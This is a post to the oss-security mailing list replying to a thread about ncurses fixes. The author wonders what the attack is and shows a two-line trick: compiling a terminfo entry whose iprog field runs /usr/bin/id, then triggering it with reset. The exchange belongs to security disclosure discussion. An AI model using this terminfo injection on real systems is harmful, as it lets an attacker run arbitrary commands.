Received: (qmail 21973 invoked by uid 550); 14 Apr 2023 19:44:30 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 19581 invoked from network); 14 Apr 2023 19:35:26 -0000
X-Injected-Via-Gmane: http://gmane.org/
To: oss-security@lists.openwall.com
From: Tavis Ormandy <taviso@gmail.com>
Date: Fri, 14 Apr 2023 19:35:07 -0000 (UTC)
Message-ID: <u1c9tb$5m4$1@ciao.gmane.io>
References: <SN6PR00MB044717AE269F0AABB8456C86A89BA@SN6PR00MB0447.namprd00.prod.outlook.com>
 <cfaf0c49-2ca1-b7a1-76a2-f495d7f5f7b4@canonical.com>
User-Agent: slrn/pre1.0.4-5 (Linux)
Subject: [oss-security] Re: ncurses fixes upstream

On 2023-04-13, Mark Esler wrote:
> When you publish the CVE json5, you can references the patch URL and 
> relevant bug discussions to help downstream. Including the CVE number in 
> the patch commit is also quite helpful.
>
> Thank you!
>
>> We've reached out to Arch, RedHat, Canonical and other popular distros independently.

I'm curious what the attack is! ISTR that terminfo definitions can
contain shell commands by design and so are generally considered
trusted.

I remember using this trick in an exploit once :)

$ printf "exploit, iprog=/usr/bin/id,\n" | tic -
$ TERM=exploit reset
uid=1000(taviso) gid=1000(taviso)

Tavis.

-- 
 _o)            $ lynx lock.cmpxchg8b.com
 /\\  _o)  _o)  $ finger taviso@sdf.org
_\_V _( ) _( )  @taviso

